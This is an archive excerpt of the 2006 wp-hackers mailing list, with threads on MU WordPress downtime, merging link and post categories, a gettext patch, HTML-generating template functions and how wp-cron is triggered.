> > "For some value of tomorrow." didn't seem to make sense
> > to me..??
>
> > and whose smug and sarcastic uselesness in response to a valid
> > question characterizes a lot of what turns people off when they
> > encounter the WP community. Imagine getting that answer to a question
> > that was important to YOU?
>
> If I didn't understand, and someone explained it to me, I wouldn't be
> quite as pissed as this mail, I'd be happy that someone stepped aside
> and took the time to explain something. Your anger seems to stem from
> something else, if you're pissed about the way the community is, open
> another thread, don't go on about it to a perfectly fine response
> here.
>
> >
> > There are at least a half-dozen professional, useful answers that
> > ought to come to mind before what was given. After all, presumably
> > "the man himself" was at least aware of-- if not responsible for-- the
> > fact that a specific date was given and an implied promise
> > unfulfilled, giving rise to the obvious and polite question.
>
> And the question was answered in a not rude and sarcastic way. I
> explained what was meant by "for some value of tomorrow." Where that
> comes off as sarcastic, I still fail to see, but as there wasn't a
> response as I skimmed the replies that explained this in a clear,
> concise way, I explained it.
>
> Perhaps your anger is slightly misdirected, it wasn't my choice that
> its not fixed today, I simply explained what Matt meant in his
> original response. I'm sorry my response wasn't outlined in hearts
> with a wonderful "I'm so sorry its not fixed even though I have
> nothing to do with the fact that its broken" apology note attached at
> the top.
>
>
> --
> --Robert Deaton
> http://somethingunpredictable.com
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
>
>
From false.hopes at gmail.com  Wed Apr  5 22:40:37 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Wed Apr  5 22:44:08 2006
Subject: [wp-hackers] MU Wordpress?
In-Reply-To: <d21a6860604051536v20e1ef5eq8a40aac75adb29ce@mail.gmail.com>
References: <d21a6860604041717m6709702aub3724d89833eb378@mail.gmail.com>
	<44336F3E.7050002@mullenweg.com>
	<d21a6860604050431s575e5b8bn6c8a58b5988ac283@mail.gmail.com>
	<a491f91d0604050435n5ddf46e2g1775c96997068473@mail.gmail.com>
	<d21a6860604050441v30eebb8o71ce32dc7658a26f@mail.gmail.com>
	<a491f91d0604051226u422375f1ka0338f1d06525087@mail.gmail.com>
	<9b1b9dab0604051356j7506a57fxaac7d5dcb3d974e7@mail.gmail.com>
	<a491f91d0604051412g2ecc8b76o3b76005582008b73@mail.gmail.com>
	<d21a6860604051536v20e1ef5eq8a40aac75adb29ce@mail.gmail.com>
Message-ID: <a491f91d0604051540k31b20e58la8d5780860620da7@mail.gmail.com>

On 4/5/06, Stuart <amanzimtoti@gmail.com> wrote:
> Thanks for sticking up for me Chris. I took Matt's response as a
> brush-off which is why I asked if someone else knew. To me it was a
> sensible question and I was hoping for a sensible response.
> And I still don't know when it will be back...

Even if you see Matt's response as a brush off, it was no reason for
Chris to attack at me personally.

--
--Robert Deaton
http://somethingunpredictable.com
From amanzimtoti at gmail.com  Wed Apr  5 22:53:41 2006
From: amanzimtoti at gmail.com (Stuart)
Date: Wed Apr  5 22:57:11 2006
Subject: [wp-hackers] Link Subcategories
In-Reply-To: <5aa3aa0604051445y75bbbac2y1c8f1b34eccac5aa@mail.gmail.com>
References: <62cad8e0604011622n4e6fb692xec5b07f7a14c1fe8@mail.gmail.com>
	<4432B5FD.6070608@mullenweg.com>
	<62cad8e0604041811q54e00ebu39acc7c226ca3a53@mail.gmail.com>
	<9b1b9dab0604051358n6b0ad122yabc77b086dd21a1c@mail.gmail.com>
	<5aa3aa0604051445y75bbbac2y1c8f1b34eccac5aa@mail.gmail.com>
Message-ID: <d21a6860604051553o3445c04bg72b18f9f538309d9@mail.gmail.com>

I was involved in a discussion a while back about the differences
between categories and tags. My own opinion is that categories and
tags serve different purposes: categories are used to group posts
together in a logical, structural way, whereas tags are used for
describing the posts in a more free-flowing method. (Wikipedia says it
best: "Tags can be used to specify properties of an object that are
not obvious to the object itself")

In a Wordpress site, categories are often used as a navigational tool
to allow you to group your posts into different sections, e.g.
Politics, Tech, Sports, etc. However, when you combine this with
tagging, you can keep your distinct sections of the site separate with
categories, but then also provide tags which describes each post and
allows deeper searching and linking between posts.

The same concept can be applied to Flickr, which allows you to group
your photos into sets, but also tag each photo with as many tags as
you want. So you can group all your holiday photos from Rome together,
while still be able to bring up a page with all the photos tagged with
'museum'.

I currently use Ultimate Tag Warrior for this, but I would much rather
have the basic tag functionality built into the Wordpress core. Then
plugin authors could build on this by creating tag cloud plugins and
the such.

That doesn't really have anything to do with the original message in
this thread, so sorry if it's off topic - I'm just continuing with the
comment that Craig made above about how categories are being treated
more as tags.

Cheers - Stuart.



On 4/6/06, Craig <nuclearmoose@gmail.com> wrote:
> I was discussing this in #wordpress earlier today. It seems that part of the
> rationale is in making the code that much simpler, and the other is to move
> WP away from categories and essentially having a tag system which offers a
> lot more flexibility.
>
> I don't claim to know this to be the truth or 100% correct, but that is what
> I got out of the talk. On my own blog, I've never conceived of bookmark
> categories and post categories to be shared in any way. That's just how my
> mindset works; perhaps this new way will offer me some advantages that I
> don't yet understand.
>
> Regardless, I'm reserving judgement on this until I understand better the
> pros and cons of the changes. For now, it simply makes my list of categories
> a lot longer and I have to be a bit more diligent to select the correct
> category (tag?).
>
> Craig.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
From amanzimtoti at gmail.com  Wed Apr  5 23:00:48 2006
From: amanzimtoti at gmail.com (Stuart)
Date: Wed Apr  5 23:04:19 2006
Subject: [wp-hackers] MU Wordpress?
In-Reply-To: <a491f91d0604051540k31b20e58la8d5780860620da7@mail.gmail.com>
References: <d21a6860604041717m6709702aub3724d89833eb378@mail.gmail.com>
	<44336F3E.7050002@mullenweg.com>
	<d21a6860604050431s575e5b8bn6c8a58b5988ac283@mail.gmail.com>
	<a491f91d0604050435n5ddf46e2g1775c96997068473@mail.gmail.com>
	<d21a6860604050441v30eebb8o71ce32dc7658a26f@mail.gmail.com>
	<a491f91d0604051226u422375f1ka0338f1d06525087@mail.gmail.com>
	<9b1b9dab0604051356j7506a57fxaac7d5dcb3d974e7@mail.gmail.com>
	<a491f91d0604051412g2ecc8b76o3b76005582008b73@mail.gmail.com>
	<d21a6860604051536v20e1ef5eq8a40aac75adb29ce@mail.gmail.com>
	<a491f91d0604051540k31b20e58la8d5780860620da7@mail.gmail.com>
Message-ID: <d21a6860604051600ua0241dfj44e61c06e7d39bc4@mail.gmail.com>

I don't know what Chris's agenda is, but I didn't think he was
attacking you personally. I thought he was just commenting on Matt's
original response, and then how the other posters didn't help with the
original question either. Matt's response was a brush-off, and the
other responses were no help either. Chris has obviously seen a bunch
of these smug, no-help posts before.

I still don't know when MU will be back - nor do the others that have
been asking the same question in the forums. Would it be so hard to
just expand on the explanation a bit, instead of just saying
'tomorrow'?


On 4/6/06, Robert Deaton <false.hopes@gmail.com> wrote:
> On 4/5/06, Stuart <amanzimtoti@gmail.com> wrote:
> > Thanks for sticking up for me Chris. I took Matt's response as a
> > brush-off which is why I asked if someone else knew. To me it was a
> > sensible question and I was hoping for a sensible response.
> > And I still don't know when it will be back...
>
> Even if you see Matt's response as a brush off, it was no reason for
> Chris to attack at me personally.
>
> --
> --Robert Deaton
> http://somethingunpredictable.com
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
>
>
From ryan at boren.nu  Wed Apr  5 23:29:54 2006
From: ryan at boren.nu (Ryan Boren)
Date: Wed Apr  5 23:33:18 2006
Subject: [wp-hackers] Link Subcategories
In-Reply-To: <d21a6860604051553o3445c04bg72b18f9f538309d9@mail.gmail.com>
References: <62cad8e0604011622n4e6fb692xec5b07f7a14c1fe8@mail.gmail.com>	<4432B5FD.6070608@mullenweg.com>	<62cad8e0604041811q54e00ebu39acc7c226ca3a53@mail.gmail.com>	<9b1b9dab0604051358n6b0ad122yabc77b086dd21a1c@mail.gmail.com>	<5aa3aa0604051445y75bbbac2y1c8f1b34eccac5aa@mail.gmail.com>
	<d21a6860604051553o3445c04bg72b18f9f538309d9@mail.gmail.com>
Message-ID: <443452F2.4000702@boren.nu>

Stuart wrote:
> That doesn't really have anything to do with the original message in
> this thread, so sorry if it's off topic - I'm just continuing with the
> comment that Craig made above about how categories are being treated
> more as tags.

Categories are for those folks who organize their sock drawers.  Sick 
and wrong, I tell ya.  ;-P

I guess the new combined categories does show a tag bias.  I suppose I'm 
in a tag mindset since we've been giving wp.com a very clear tag bias. 
We have a global categories pool and encourage using them as tags.  Some 
people have over a hundred tags/cats.  If you are a tagger, the combined 
categories makes sense and is quite nice.  I had a lot of overlap 
between categories and link categories and don't miss the separation one 
bit.   If you are a taxonomist, the new system probably doesn't fit your 
old, crusty, in-need-of-a-fresh-new-look style. :-)

Let us build a bridge, link hands, and sing bad folk tunes.  How about 
this?  If a category has only links assigned to it, don't show it in the 
categories box on the post page.  If a category only has posts assigned 
to it, don't show it on the links page.  Categories that have neither 
links nor posts assigned will show up in both and wait to be claimed. 
Typing in a category name in the little create-on-the-fly widget will 
create and display the category if it doesn't already exist or just 
display the category if it does already exist.

Ryan


From rbennett at une.edu.au  Wed Apr  5 23:34:33 2006
From: rbennett at une.edu.au (Ross M. W. Bennetts)
Date: Wed Apr  5 23:38:09 2006
Subject: [wp-hackers] MU Wordpress?
In-Reply-To: <d21a6860604051600ua0241dfj44e61c06e7d39bc4@mail.gmail.com>
Message-ID: <005501c65909$7e078e80$8508b481@rosslaptop>

It seems to be back online now...

Ross M. W. Bennetts
rbennett@une.edu.au
Assistant Webmaster
University of New England
Armidale, Australia


From chris.lott at gmail.com  Thu Apr  6 01:52:23 2006
From: chris.lott at gmail.com (Chris Lott)
Date: Thu Apr  6 01:55:51 2006
Subject: [wp-hackers] Link Subcategories
In-Reply-To: <443452F2.4000702@boren.nu>
References: <62cad8e0604011622n4e6fb692xec5b07f7a14c1fe8@mail.gmail.com>
	<4432B5FD.6070608@mullenweg.com>
	<62cad8e0604041811q54e00ebu39acc7c226ca3a53@mail.gmail.com>
	<9b1b9dab0604051358n6b0ad122yabc77b086dd21a1c@mail.gmail.com>
	<5aa3aa0604051445y75bbbac2y1c8f1b34eccac5aa@mail.gmail.com>
	<d21a6860604051553o3445c04bg72b18f9f538309d9@mail.gmail.com>
	<443452F2.4000702@boren.nu>
Message-ID: <9b1b9dab0604051852t4a1d079dr4181ddddc130ce0d@mail.gmail.com>

Intuitively, the problem is that (and I love tags), I apply (or at
least would like to apply) tags differently to posts than I do links.
For one thing, posts are mine and most links are to sites that are
not. So posts tagged "composition" or "rhetoric" or "consume" as
applied to my own content are pretty different from what one would
find looking at links tagged that way.

I don't go so far as to want to maintain two sets of tags (for me/for
others) or any such thing, but forcing an aggregation seems backwards.

c
From chris.lott at gmail.com  Thu Apr  6 01:55:09 2006
From: chris.lott at gmail.com (Chris Lott)
Date: Thu Apr  6 01:58:38 2006
Subject: [wp-hackers] MU Wordpress?
In-Reply-To: <a491f91d0604051540k31b20e58la8d5780860620da7@mail.gmail.com>
References: <d21a6860604041717m6709702aub3724d89833eb378@mail.gmail.com>
	<44336F3E.7050002@mullenweg.com>
	<d21a6860604050431s575e5b8bn6c8a58b5988ac283@mail.gmail.com>
	<a491f91d0604050435n5ddf46e2g1775c96997068473@mail.gmail.com>
	<d21a6860604050441v30eebb8o71ce32dc7658a26f@mail.gmail.com>
	<a491f91d0604051226u422375f1ka0338f1d06525087@mail.gmail.com>
	<9b1b9dab0604051356j7506a57fxaac7d5dcb3d974e7@mail.gmail.com>
	<a491f91d0604051412g2ecc8b76o3b76005582008b73@mail.gmail.com>
	<d21a6860604051536v20e1ef5eq8a40aac75adb29ce@mail.gmail.com>
	<a491f91d0604051540k31b20e58la8d5780860620da7@mail.gmail.com>
Message-ID: <9b1b9dab0604051855w29313985oe0bbe4c6c4d6faab@mail.gmail.com>

On 4/5/06, Robert Deaton <false.hopes@gmail.com> wrote:
> Even if you see Matt's response as a brush off, it was no reason for
> Chris to attack at me personally.

I wasn't attacking you personally. In fact, I wasn't referring to you
at all except with my rhetorical question that was meant to equate to:
"how would you like Matt's smart answer if it were you asking a
question that was important to you?"

My apologies if it seemed that I was characterizing your post!

c
From false.hopes at gmail.com  Thu Apr  6 01:58:44 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Thu Apr  6 02:02:18 2006
Subject: [wp-hackers] MU Wordpress?
In-Reply-To: <9b1b9dab0604051855w29313985oe0bbe4c6c4d6faab@mail.gmail.com>
References: <d21a6860604041717m6709702aub3724d89833eb378@mail.gmail.com>
	<d21a6860604050431s575e5b8bn6c8a58b5988ac283@mail.gmail.com>
	<a491f91d0604050435n5ddf46e2g1775c96997068473@mail.gmail.com>
	<d21a6860604050441v30eebb8o71ce32dc7658a26f@mail.gmail.com>
	<a491f91d0604051226u422375f1ka0338f1d06525087@mail.gmail.com>
	<9b1b9dab0604051356j7506a57fxaac7d5dcb3d974e7@mail.gmail.com>
	<a491f91d0604051412g2ecc8b76o3b76005582008b73@mail.gmail.com>
	<d21a6860604051536v20e1ef5eq8a40aac75adb29ce@mail.gmail.com>
	<a491f91d0604051540k31b20e58la8d5780860620da7@mail.gmail.com>
	<9b1b9dab0604051855w29313985oe0bbe4c6c4d6faab@mail.gmail.com>
Message-ID: <a491f91d0604051858h301fea98ybe4c80c79f5944cd@mail.gmail.com>

On 4/5/06, Chris Lott <chris.lott@gmail.com> wrote:
> On 4/5/06, Robert Deaton <false.hopes@gmail.com> wrote:
> > Even if you see Matt's response as a brush off, it was no reason for
> > Chris to attack at me personally.
>
> I wasn't attacking you personally. In fact, I wasn't referring to you
> at all except with my rhetorical question that was meant to equate to:
> "how would you like Matt's smart answer if it were you asking a
> question that was important to you?"
>
> My apologies if it seemed that I was characterizing your post!

Try hitting the reply button on a post further up in the thread next
time, then. When my name is quoted as the first one with a post like
that, you come off like... well, let's leave it at that.

--
--Robert Deaton
http://somethingunpredictable.com
From ringmaster at midnightcircus.com  Thu Apr  6 02:07:52 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Thu Apr  6 02:11:32 2006
Subject: [wp-hackers] Link Subcategories
In-Reply-To: <9b1b9dab0604051852t4a1d079dr4181ddddc130ce0d@mail.gmail.com>
References: <62cad8e0604011622n4e6fb692xec5b07f7a14c1fe8@mail.gmail.com>
	<4432B5FD.6070608@mullenweg.com>
	<62cad8e0604041811q54e00ebu39acc7c226ca3a53@mail.gmail.com>
	<9b1b9dab0604051358n6b0ad122yabc77b086dd21a1c@mail.gmail.com>
	<5aa3aa0604051445y75bbbac2y1c8f1b34eccac5aa@mail.gmail.com>
	<d21a6860604051553o3445c04bg72b18f9f538309d9@mail.gmail.com>
	<443452F2.4000702@boren.nu>
	<9b1b9dab0604051852t4a1d079dr4181ddddc130ce0d@mail.gmail.com>
Message-ID: <443477F8.90208@midnightcircus.com>

Chris Lott wrote:
> Intuitively, the problem is that (and I love tags), I apply (or at
> least would like to apply) tags differently to posts than I do links.

Putting aside the tags vs. category argument (which is pointless 
considering that the committers are apparently both avid taggers) I'm 
still somewhat baffled by the combination of the two.

I certainly see the benefit of having a single shared datastore for the 
categories of both links and posts, but I see no utility to users of 
WordPress that these two be shared.

If the original intention was as ryan recently said, to make it seem 
like they are separate things even though they are not, then everything 
makes sense.  But I'm curious about the intentions of having mixed 
link/post categories - maybe you're onto something I didn't think of and 
I just need it explained a little better.

That said, categories and tags are certainly not the same thing.  Of 
course, I do organize my socks - in a manner of speaking.  [1]  :p

Owen

[1]: http://spoken-for.org/archives/2004/10/29/584/

From amanzimtoti at gmail.com  Thu Apr  6 02:20:01 2006
From: amanzimtoti at gmail.com (Stuart)
Date: Thu Apr  6 02:23:30 2006
Subject: [wp-hackers] Link Subcategories
In-Reply-To: <443477F8.90208@midnightcircus.com>
References: <62cad8e0604011622n4e6fb692xec5b07f7a14c1fe8@mail.gmail.com>
	<4432B5FD.6070608@mullenweg.com>
	<62cad8e0604041811q54e00ebu39acc7c226ca3a53@mail.gmail.com>
	<9b1b9dab0604051358n6b0ad122yabc77b086dd21a1c@mail.gmail.com>
	<5aa3aa0604051445y75bbbac2y1c8f1b34eccac5aa@mail.gmail.com>
	<d21a6860604051553o3445c04bg72b18f9f538309d9@mail.gmail.com>
	<443452F2.4000702@boren.nu>
	<9b1b9dab0604051852t4a1d079dr4181ddddc130ce0d@mail.gmail.com>
	<443477F8.90208@midnightcircus.com>
Message-ID: <d21a6860604051920y2c95fce1j19130a6c63c89090@mail.gmail.com>

I wish my socks were as organised as my blog...


On 4/6/06, Owen Winkler <ringmaster@midnightcircus.com> wrote:
> Chris Lott wrote:
> > Intuitively, the problem is that (and I love tags), I apply (or at
> > least would like to apply) tags differently to posts than I do links.
>
> Putting aside the tags vs. category argument (which is pointless
> considering that the committers are apparently both avid taggers) I'm
> still somewhat baffled by the combination of the two.
>
> I certainly see the benefit of having a single shared datastore for the
> categories of both links and posts, but I see no utility to users of
> WordPress that these two be shared.
>
> If the original intention was as ryan recently said, to make it seem
> like they are separate things even though they are not, then everything
> makes sense.  But I'm curious about the intentions of having mixed
> link/post categories - maybe you're onto something I didn't think of and
> I just need it explained a little better.
>
> That said, categories and tags are certainly not the same thing.  Of
> course, I do organize my socks - in a manner of speaking.  [1]  :p
>
> Owen
>
> [1]: http://spoken-for.org/archives/2004/10/29/584/
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
From handy.solo at gmail.com  Thu Apr  6 04:45:24 2006
From: handy.solo at gmail.com (Handy)
Date: Thu Apr  6 04:48:58 2006
Subject: [wp-hackers] Stumped on a dashboard issue
Message-ID: <2c7a50940604052145w17b22f46k1850b23b24229af@mail.gmail.com>

Gents and Ladies,

Pardon the intrusion.  Been lurking a bit via the web interface and really
am not sure if this is the right place... but I'm stumped and hoping for
some insight.

I have an issue with "the dashboard".  I've posted a series of articles
here: http://wordpress.org/support/topic/65565?replies=10
without much luck.  I consider myself somewhat "handy" but this one has me
stumped.

Wondering if anyone could take a minute to read that series of posts and
offer up some ideas?  The issue is not the "end of the world" by any means.
But I hate being stumped.  ;-)
From m at mullenweg.com  Thu Apr  6 07:54:09 2006
From: m at mullenweg.com (Matt Mullenweg)
Date: Thu Apr  6 07:57:36 2006
Subject: [wp-hackers] MU Wordpress?
In-Reply-To: <005501c65909$7e078e80$8508b481@rosslaptop>
References: <005501c65909$7e078e80$8508b481@rosslaptop>
Message-ID: <4434C921.90403@mullenweg.com>

Ross M. W. Bennetts wrote:
> It seems to be back online now...

They've been up since I sent the first message, which makes the whole 
thread rather humorous.

-- 
Matt Mullenweg
  http://photomatt.net | http://wordpress.org
http://automattic.com | http://akismet.com
From amanzimtoti at gmail.com  Thu Apr  6 08:53:50 2006
From: amanzimtoti at gmail.com (Stuart)
Date: Thu Apr  6 08:57:21 2006
Subject: [wp-hackers] MU Wordpress?
In-Reply-To: <4434C921.90403@mullenweg.com>
References: <005501c65909$7e078e80$8508b481@rosslaptop>
	<4434C921.90403@mullenweg.com>
Message-ID: <d21a6860604060153s5c8fcff3t44408ac21fb6ff49@mail.gmail.com>

You could have just said that.

On 4/6/06, Matt Mullenweg <m@mullenweg.com> wrote:
> Ross M. W. Bennetts wrote:
> > It seems to be back online now...
>
> They've been up since I sent the first message, which makes the whole
> thread rather humorous.
>
> --
> Matt Mullenweg
>   http://photomatt.net | http://wordpress.org
> http://automattic.com | http://akismet.com
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
From nsabbi at email.it  Thu Apr  6 10:30:59 2006
From: nsabbi at email.it (Nico Sabbi)
Date: Thu Apr  6 10:36:30 2006
Subject: [wp-hackers] [PATCH] use system-wide gettext() when available
Message-ID: <4434EDE3.4030004@email.it>

The attached patch uses php-gettext module when available, registering 
to the domain "wordpress";
you also have to install the .mo file in your system locales directory, 
in my case

/usr/share/locale/it/LC_MESSAGES/wordpress.mo

Tested on RH-ES4-64 bit, where this patch is the only way to have 
translation working,
as far as I know.

Bye,

    Nico

 
 
 --
 Email.it, the professional e-mail, gratis per te: http://www.email.it/f
 
 Sponsor:
 Gioca e vinci con Wilkinson, in palio romantici week end per 2!
 Clicca qui: http://adv.email.it/cgi-bin/foclick.cgi?mid=4997&d=6-4
From dougal at gunters.org  Thu Apr  6 17:47:40 2006
From: dougal at gunters.org (Dougal Campbell)
Date: Thu Apr  6 17:54:15 2006
Subject: [wp-hackers] Functions that generate html tags?
Message-ID: <4435543C.5080605@gunters.org>

Many of the template functions that we use will return plain text (e.g., 
  the_title, the_author, bloginfo, etc.). But some return HTML-tagged 
content (e.g., wp_list_pages, wp_list_cats, wp_loginout, etc.)

Has anyone documented which functions generate HTML, along with what tag 
structure they use? I did a quick Codex search, but nothing came up. I 
think this would be a very useful reference for theme developers to have.

-- 
Dougal Campbell <dougal@gunters.org>
http://dougal.gunters.org/

From grijalva at gmail.com  Thu Apr  6 18:17:36 2006
From: grijalva at gmail.com (Dave Grijalva)
Date: Thu Apr  6 18:21:11 2006
Subject: [wp-hackers] MU Wordpress?
In-Reply-To: <21cf363b0604050718y6e5e0388wd9eb983ef900a1b2@mail.gmail.com>
References: <d21a6860604041717m6709702aub3724d89833eb378@mail.gmail.com>
	<44336F3E.7050002@mullenweg.com>
	<d21a6860604050431s575e5b8bn6c8a58b5988ac283@mail.gmail.com>
	<a491f91d0604050435n5ddf46e2g1775c96997068473@mail.gmail.com>
	<d21a6860604050441v30eebb8o71ce32dc7658a26f@mail.gmail.com>
	<42648.199.64.72.252.1144241819.squirrel@epia.ftwr.co.uk>
	<21cf363b0604050718y6e5e0388wd9eb983ef900a1b2@mail.gmail.com>
Message-ID: <a0159cd30604061117y6db2adcdqa0cf4ad720ae1225@mail.gmail.com>

you mean <?php $tomorrow = strtotime('tomorrow'); ?> ?

On 4/5/06, Dave Pappas <villiageidiot@gmail.com> wrote:
>
> Tomorrow = April 5, 2006
>
> On 4/5/06, Peter Westwood <peter.westwood@ftwr.co.uk> wrote:
> >
> >
> > On Wed, April 5, 2006 12:41 pm, Stuart wrote:
> > > Yeah - I know who Matt is... just hoping to get a better response from
> > > someone else - "For some value of tomorrow." didn't seem to make sense
> > > to me..??
> > >
> >
> > Maybe "ma?ana" fits better:
> >   1. Tomorrow.
> >   2. At an unspecified future time.
> >
> > I think what Matt means is it will be back when its back when he has the
> > time to finish the migration of mu.wordpress.org to the new server
> >
> > westi
> > --
> > Peter Westwood <peter.westwood@ftwr.co.uk>
> > http://blog.ftwr.co.uk
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers@lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
From lists at abhaykumar.net  Thu Apr  6 18:43:39 2006
From: lists at abhaykumar.net (Abhay Kumar)
Date: Thu Apr  6 18:47:12 2006
Subject: [wp-hackers] MU Wordpress?
In-Reply-To: <a0159cd30604061117y6db2adcdqa0cf4ad720ae1225@mail.gmail.com>
References: <d21a6860604041717m6709702aub3724d89833eb378@mail.gmail.com>
	<44336F3E.7050002@mullenweg.com>
	<d21a6860604050431s575e5b8bn6c8a58b5988ac283@mail.gmail.com>
	<a491f91d0604050435n5ddf46e2g1775c96997068473@mail.gmail.com>
	<d21a6860604050441v30eebb8o71ce32dc7658a26f@mail.gmail.com>
	<42648.199.64.72.252.1144241819.squirrel@epia.ftwr.co.uk>
	<21cf363b0604050718y6e5e0388wd9eb983ef900a1b2@mail.gmail.com>
	<a0159cd30604061117y6db2adcdqa0cf4ad720ae1225@mail.gmail.com>
Message-ID: <512061b90604061143g6ae11373l784160e87b4eb491@mail.gmail.com>

I think it's nice to take a step back from frivolous arguments and
focus on some more interesting and rewarding ways to pass the time.

If you're bored, I'm sure someone somewhere has something for you to do :)

Close your eyes, Inhale deeply, Exhale completely, open your eyes and
continue to breathe normally.

It's either that or take your worries out with a good ol-fashioned
barenuckled throwdown in the back alley across from the commercial
area of <insert your city here>.

*sigh*

On 4/6/06, Dave Grijalva <grijalva@gmail.com> wrote:
> you mean <?php $tomorrow = strtotime('tomorrow'); ?> ?
>
> On 4/5/06, Dave Pappas <villiageidiot@gmail.com> wrote:
> >
> > Tomorrow = April 5, 2006
> >
> > On 4/5/06, Peter Westwood <peter.westwood@ftwr.co.uk> wrote:
> > >
> > >
> > > On Wed, April 5, 2006 12:41 pm, Stuart wrote:
> > > > Yeah - I know who Matt is... just hoping to get a better response from
> > > > someone else - "For some value of tomorrow." didn't seem to make sense
> > > > to me..??
> > > >
> > >
> > > Maybe "ma?ana" fits better:
> > >   1. Tomorrow.
> > >   2. At an unspecified future time.
> > >
> > > I think what Matt means is it will be back when its back when he has the
> > > time to finish the migration of mu.wordpress.org to the new server
> > >
> > > westi
> > > --
> > > Peter Westwood <peter.westwood@ftwr.co.uk>
> > > http://blog.ftwr.co.uk
> > > _______________________________________________
> > > wp-hackers mailing list
> > > wp-hackers@lists.automattic.com
> > > http://lists.automattic.com/mailman/listinfo/wp-hackers
> > >
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers@lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>


--
Abhay Kumar
http://abhaykumar.net/
From skeltoac at gmail.com  Thu Apr  6 23:04:05 2006
From: skeltoac at gmail.com (Andy Skelton)
Date: Thu Apr  6 23:07:37 2006
Subject: [wp-hackers] Link Subcategories
In-Reply-To: <443452F2.4000702@boren.nu>
References: <62cad8e0604011622n4e6fb692xec5b07f7a14c1fe8@mail.gmail.com>
	<4432B5FD.6070608@mullenweg.com>
	<62cad8e0604041811q54e00ebu39acc7c226ca3a53@mail.gmail.com>
	<9b1b9dab0604051358n6b0ad122yabc77b086dd21a1c@mail.gmail.com>
	<5aa3aa0604051445y75bbbac2y1c8f1b34eccac5aa@mail.gmail.com>
	<d21a6860604051553o3445c04bg72b18f9f538309d9@mail.gmail.com>
	<443452F2.4000702@boren.nu>
Message-ID: <e6ec604d0604061604l433349f1ibb44174d51971c9d@mail.gmail.com>

On 4/5/06, Ryan Boren <ryan@boren.nu> wrote:
> Categories are for those folks who organize their sock drawers.  Sick
> and wrong, I tell ya.  ;-P

You keep your socks together in a "sock drawer?" THAT is sick. ;-)

Andy
From false.hopes at gmail.com  Fri Apr  7 00:23:40 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Fri Apr  7 00:27:13 2006
Subject: [wp-hackers] Link Subcategories
In-Reply-To: <e6ec604d0604061604l433349f1ibb44174d51971c9d@mail.gmail.com>
References: <62cad8e0604011622n4e6fb692xec5b07f7a14c1fe8@mail.gmail.com>
	<4432B5FD.6070608@mullenweg.com>
	<62cad8e0604041811q54e00ebu39acc7c226ca3a53@mail.gmail.com>
	<9b1b9dab0604051358n6b0ad122yabc77b086dd21a1c@mail.gmail.com>
	<5aa3aa0604051445y75bbbac2y1c8f1b34eccac5aa@mail.gmail.com>
	<d21a6860604051553o3445c04bg72b18f9f538309d9@mail.gmail.com>
	<443452F2.4000702@boren.nu>
	<e6ec604d0604061604l433349f1ibb44174d51971c9d@mail.gmail.com>
Message-ID: <a491f91d0604061723v5b51d49k2ab67a22552b6eab@mail.gmail.com>

On 4/6/06, Andy Skelton <skeltoac@gmail.com> wrote:
> On 4/5/06, Ryan Boren <ryan@boren.nu> wrote:
> > Categories are for those folks who organize their sock drawers.  Sick
> > and wrong, I tell ya.  ;-P
>
> You keep your socks together in a "sock drawer?" THAT is sick. ;-)

You all wear socks? THAT'S sick, leather thongs all the way, baby.
(get your mind out of the gutter!)

--
--Robert Deaton
http://somethingunpredictable.com
From ringmaster at midnightcircus.com  Fri Apr  7 14:03:45 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Fri Apr  7 14:03:59 2006
Subject: [wp-hackers] Cron?  Anyone?
Message-ID: <44367141.80602@midnightcircus.com>

Hi folks, simple question:

Where in the 2.1 source is wp_cron() called?  wp_cron() being the 
function that primes the cron engine by calling spawn_cron().  And 
spawn_cron() creates a socket to request wp-cron.php, which executes the 
hooks that have expired timestamps.

At this point, having written a few posts on 2.1, I would expect that I 
would see a couple of "wp-cron.php" entries in my apache logs, since 
various things are set to happen via wp-cron (like pinging) when you 
post a new entry.

Maybe I'm blind?  Or was there something I was supposed to do to enable 
this?

Owen



From peter.westwood at ftwr.co.uk  Fri Apr  7 14:30:07 2006
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Fri Apr  7 14:33:44 2006
Subject: [wp-hackers] Cron?  Anyone?
In-Reply-To: <44367141.80602@midnightcircus.com>
References: <44367141.80602@midnightcircus.com>
Message-ID: <23126.199.64.72.252.1144420207.squirrel@epia.ftwr.co.uk>

On Fri, April 7, 2006 3:03 pm, Owen Winkler wrote:
> Hi folks, simple question:
>
> Where in the 2.1 source is wp_cron() called?  wp_cron() being the
function that primes the cron engine by calling spawn_cron().  And
spawn_cron() creates a socket to request wp-cron.php, which executes the
hooks that have expired timestamps.
>
> At this point, having written a few posts on 2.1, I would expect that I
would see a couple of "wp-cron.php" entries in my apache logs, since
various things are set to happen via wp-cron (like pinging) when you
post a new entry.
>
> Maybe I'm blind?  Or was there something I was supposed to do to enable
this?

Scanning through my local phpxref'd copy of the trunk source it looks like
wp-cron is called on the "init" hook if we are currently not already doing
cron (see /wp-includes/default-filters.php lines 89-90).

Whether or not anything currently uses cron is another question.
Looking around there does seem to be a number of references to
wp_schedule_single_event - notably for pings and future posts.

I've just tried a future post on my test blog - now I wait to see if it
turns up....

westi
-- 
